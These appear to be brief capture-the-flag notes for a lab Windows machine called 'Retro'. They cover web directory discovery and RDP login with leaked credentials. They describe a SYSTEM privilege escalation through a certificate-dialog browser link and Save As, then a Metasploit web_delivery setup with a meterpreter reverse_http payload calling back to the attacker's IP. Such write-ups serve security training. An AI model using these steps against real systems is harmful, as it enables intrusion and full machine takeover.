dirbuster finds /retro

MSRDP user and pass found on website hosted there (check user comments)

RDP login, get the file out of recycle bin and try to run it

click through the links regarding certs until you find a hyperlink which will run the web browser as nt authority\system

in browser do save as > type into file name `C:\Windows\System32\*.*` then right click cmd and run - huzzah!

metasploit
```
select exploit/multi/script/web_delivery
set target 2  # PSH
set lhost $LOCAL_VPN_IP  # see ip addr
set payload windows/meterpreter/reverse_http
```

copy the command from metasploit to RDP
